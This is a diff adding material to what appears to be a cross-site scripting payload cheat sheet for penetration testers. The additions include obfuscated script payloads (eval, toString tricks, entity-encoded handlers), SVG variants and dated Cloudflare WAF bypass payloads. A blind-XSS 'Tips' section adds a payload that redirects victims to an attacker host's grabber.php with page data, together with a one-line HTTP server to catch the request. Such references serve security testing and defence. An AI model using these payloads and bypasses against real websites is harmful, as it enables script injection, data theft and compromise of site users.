@@ -134,9 +134,39 @@ More exploits at [http://www.xss-payloads.com/payloads-list.html?a#category=all]
 
 ## Identify an XSS endpoint
 
+This payload opens the debugger in the developper console rather than triggering a popup alert box.
+
 ```javascript
 <script>debugger;</script>
 ```
+
+Modern applications with content hosting can use [sandbox domains][sandbox-domains]
+
+> to safely host various types of user-generated content. Many of these sandboxes are specifically meant to isolate user-uploaded HTML, JavaScript, or Flash applets and make sure that they can't access any user data.
+
+[sandbox-domains]:https://security.googleblog.com/2012/08/content-hosting-for-modern-web.html
+
+For this reason, it's better to use `alert(document.domain)` or `alert(window.origin)` rather than `alert(1)` as default XSS payload in order to know in which scope the XSS is actually executing.
+
+Better payload replacing `<script>alert(1)</script>`:
+
+```html
+<script>alert(document.domain.concat("\n").concat(window.origin))</script>
+```
+
+While `alert()` is nice for reflected XSS it can quickly become a burden for stored XSS because it requires to close the popup for each execution, so `console.log()` can be used instead to display a message in the console of the developper console (doesn't require any interaction).
+
+Example:
+
+```html
+<script>console.log("Test XSS from the search bar of page XYZ\n".concat(document.domain).concat("\n").concat(window.origin))</script>
+```
+
+References:
+
+- [Google Bughunter University - XSS in sandbox domains](https://sites.google.com/site/bughunteruniversity/nonvuln/xss-in-sandbox-domain)
+- [LiveOverflow Video - DO NOT USE alert(1) for XSS](https://www.youtube.com/watch?v=KHwVjzWei1c)
+- [LiveOverflow blog post - DO NOT USE alert(1) for XSS](https://liveoverflow.com/do-not-use-alert-1-in-xss/)
 
 ### Tools 
 
@@ -158,6 +188,9 @@ Most tools are also suitable for blind XSS attacks:
 <scr<script>ipt>alert('XSS')</scr<script>ipt>
 "><script>alert('XSS')</script>
 "><script>alert(String.fromCharCode(88,83,83))</script>
+<script>\u0061lert('22')</script>
+<script>eval('\x61lert(\'33\')')</script>
+<script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt("confirm",30) == 8680439 && 8680439..toString(30) == "confirm"
 
 // Img payload
 <img src=x onerror=alert('XSS');>
@@ -177,6 +210,8 @@ Most tools are also suitable for blind XSS attacks:
 "><svg/onload=alert(String.fromCharCode(88,83,83))>
 "><svg/onload=alert(/XSS/)
 <svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)
+<svg><script>alert('33')
+<svg><script>alert&lpar;'33'&rpar;
 
 // Div payload
 <div onpointerover="alert(45)">MOVE HERE</div>
@@ -223,6 +258,12 @@ e.g: 14.rs/#alert(document.domain)
 ```javascript
 <input type="hidden" accesskey="X" onclick="alert(1)">
 Use CTRL+SHIFT+X to trigger the onclick event
+```
+
+### XSS when payload is reflected capitalized
+
+```javascript
+<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>
 ```
 
 ### DOM based XSS
@@ -437,7 +478,6 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'https://yoursu
 
 - [sleepy-puppy - Netflix](https://github.com/Netflix-Skunkworks/sleepy-puppy)
 - [bXSS - LewisArdern](https://github.com/LewisArdern/bXSS)
-- [BlueLotus_XSSReceiver - FiresunCN](https://github.com/firesunCN/BlueLotus_XSSReceiver)
 - [ezXSS - ssl](https://github.com/ssl/ezXSS)
 
 ### Blind XSS endpoint
@@ -452,6 +492,22 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'https://yoursu
   - Administrative Panel logs
 - Comment Box
   - Administrative Panel
+
+### Tips
+
+You can use a [Data grabber for XSS](#data-grabber-for-xss) and a one-line HTTP server to confirm the existence of a blind XSS before deploying a heavy blind-XSS testing tool.
+
+Eg. payload
+
+```html
+<script>document.location='http://10.10.14.30:8080/XSS/grabber.php?c='+document.domain</script>
+```
+
+Eg. one-line HTTP server:
+
+```
+$ ruby -run -ehttpd . -p8080
+```
 
 ## Mutated XSS
 
@@ -890,15 +946,6 @@ transformed into U+0022 QUOTATION MARK (")
 Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was
 transformed into U+0027 APOSTROPHE (')
 
-Unicode character U+FF1C FULLWIDTH LESS­THAN SIGN (encoded as %EF%BC%9C) was
-transformed into U+003C LESS­THAN SIGN (<)
-
-Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was
-transformed into U+0022 QUOTATION MARK (")
-
-Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was
-transformed into U+0027 APOSTROPHE (')
-
 E.g : http://www.example.net/something%CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert%28/XSS/%29%EF%BC%9E/
 %EF%BC%9E becomes >
 %EF%BC%9C becomes <
@@ -993,7 +1040,9 @@ Check the CSP on [https://csp-evaluator.withgoogle.com](https://csp-evaluator.wi
 <script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);>"
 ```
 
-More JSONP endpoints available in [/Intruders/jsonp_endpoint.txt](Intruders/jsonp_endpoint.txt)
+More JSONP endpoints:
+* [/Intruders/jsonp_endpoint.txt](Intruders/jsonp_endpoint.txt)
+* [JSONBee/jsonp.txt](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt)
 
 ### Bypass CSP by [lab.wallarm.com](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa)
 
@@ -1032,6 +1081,13 @@ Works for CSP like `script-src 'self' data:`
 ## Common WAF Bypass
 
 ### Cloudflare XSS Bypasses by [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)
+
+#### 25st January 2021
+
+```html
+<svg/onrandom=random onload=confirm(1)>
+<video onnull=null onmouseover=confirm(1)>
+```
 
 #### 21st April 2020
 
